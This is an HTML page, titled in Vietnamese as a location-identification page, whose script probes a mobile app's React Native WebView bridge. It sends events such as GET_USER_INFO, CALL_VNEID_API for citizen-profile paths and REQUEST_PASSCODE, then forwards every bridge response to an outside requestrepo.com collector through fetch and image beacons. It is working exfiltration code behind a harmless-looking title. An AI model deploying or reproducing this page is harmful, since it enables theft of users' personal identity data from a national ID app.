<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Định danh địa điểm</title>
<style>
body { font-family: sans-serif; margin: 12px; background: #f5f5f5; font-size: 14px; }
h3 { margin: 4px 0; font-size: 15px; }
button { margin: 4px; padding: 8px 12px; font-size: 13px; border: 1px solid #ccc; border-radius: 4px; background: #fff; }
button.ok { border-color: #34a853; background: #e6f4ea; }
button.fail { border-color: #ea4335; background: #fce8e6; }
#log { font-size: 11px; color: #333; white-space: pre-wrap; word-break: break-all; max-height: 60vh; overflow: auto; background: #fff; padding: 8px; border-radius: 4px; margin-top: 8px; }
</style>
</head>
<body>
<h3 id="status">Waiting for bridge...</h3>

<div id="buttons"></div>
<div id="log"></div>

<script>
var EXFIL = 'https://9liv9n84.requestrepo.com';
var logEl = document.getElementById('log');
var bridgeReady = false;

function log(msg) {
  var line = new Date().toISOString().substr(11,12) + ' ' + msg;
  logEl.textContent = line + '\n' + logEl.textContent;
  console.log(msg);
}

function exfil(tag, data) {
  var payload = encodeURIComponent(JSON.stringify(data));
  try { fetch(EXFIL + '/' + tag + '?d=' + payload, {mode:'no-cors'}); } catch(_){}
  new Image().src = EXFIL + '/' + tag + '?d=' + payload;
}

function sendEvent(event, data) {
  log('SEND >> ' + event + ' ' + JSON.stringify(data||{}));
  try {
    window.ReactNativeWebView.postMessage(JSON.stringify({event: event, data: data || {}}));
    log('SEND OK');
  } catch(e) {
    log('SEND ERR: ' + e.message);
  }
}

// === Listen on ALL 3 response paths ===
window.addEventListener('message', function(e) {
  try {
    var raw = typeof e.data === 'string' ? e.data : JSON.stringify(e.data);
    log('RECV postMessage: ' + raw.substring(0, 500));
    var data = typeof e.data === 'string' ? JSON.parse(e.data) : e.data;
    if (data && data.event) {
      exfil('diag_' + data.event, data);
    }
  } catch(err) {
    log('RECV postMessage parse err: ' + err.message);
  }
});

window.addEventListener('nativeMessage', function(e) {
  log('RECV nativeMessage: ' + JSON.stringify(e.detail).substring(0, 500));
  if (e.detail && e.detail.event) {
    exfil('diag_' + e.detail.event, e.detail);
  }
});

window.handleNativeMessage = function(data) {
  log('RECV handleNativeMessage: ' + JSON.stringify(data).substring(0, 500));
  if (data && data.event) {
    exfil('diag_' + data.event, data);
  }
};

// === Event definitions (each button sends one event) ===
var events = [
  {label: '1. GET_USER_INFO (baseline)', event: 'GET_USER_INFO', data: {}},
  {label: '2. GET_DEVICE_INSETS (sync)', event: 'GET_DEVICE_INSETS', data: {}},
  {label: '3. SET_LOADING show', event: 'SET_LOADING', data: {show: true}},
  {label: '4. SET_LOADING hide', event: 'SET_LOADING', data: {show: false}},
  {label: '5. CHANGE_SCROLLABLE', event: 'CHANGE_SCROLLABLE', data: {enable: true}},
  {label: '6. CALL_VNEID_API', event: 'CALL_VNEID_API', data: {method: 'GET', path: '/citizen/api/profile', params: {}}},
  {label: '7. CALL_VNEID_API v2', event: 'CALL_VNEID_API', data: {method: 'GET', path: '/api/v2/citizen/profile', params: {}}},
  {label: '8. REQUEST_PASSCODE', event: 'REQUEST_PASSCODE', data: {}},
  {label: '9. NAVIGATE_SCREEN (screen)', event: 'NAVIGATE_SCREEN', data: {screen: 'FAQScreen', params: {}}},
  {label: '10. NAVIGATE_SCREEN (name)', event: 'NAVIGATE_SCREEN', data: {name: 'FAQScreen', params: {}}},
  {label: '11. OPEN_LINK', event: 'OPEN_LINK', data: {link: 'https://9liv9n84.requestrepo.com/v07_openlink'}},
  {label: '12. ON_BACK', event: 'ON_BACK', data: {}},
  {label: '13. OPEN_QR_SCAN', event: 'OPEN_QR_SCAN', data: {}},
  {label: '14. SAVE_IMAGE', event: 'SAVE_IMAGE', data: {base64: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=='}},
  {label: '15. ALL AUTO', event: null}
];

var btnContainer = document.getElementById('buttons');
events.forEach(function(item, i) {
  var btn = document.createElement('button');
  btn.textContent = item.label;
  btn.onclick = function() {
    if (item.event === null) {
      // Send all non-destructive events with delays
      log('=== AUTO: sending all events ===');
      var safe = events.filter(function(e) { return e.event && e.event !== 'ON_BACK' && e.event !== 'OPEN_LINK' && e.event !== 'NAVIGATE_SCREEN'; });
      safe.forEach(function(e, j) {
        setTimeout(function() { sendEvent(e.event, e.data); }, j * 800);
      });
      return;
    }
    sendEvent(item.event, item.data);
  };
  btnContainer.appendChild(btn);
});

// === Bootstrap ===
function tryStart() {
  if (window.ReactNativeWebView && window.ReactNativeWebView.postMessage) {
    bridgeReady = true;
    document.getElementById('status').textContent = 'Bridge ready — tap to test';
    log('ReactNativeWebView ready');
  } else {
    setTimeout(tryStart, 200);
  }
}
setTimeout(tryStart, 300);
</script>
</body>
</html>
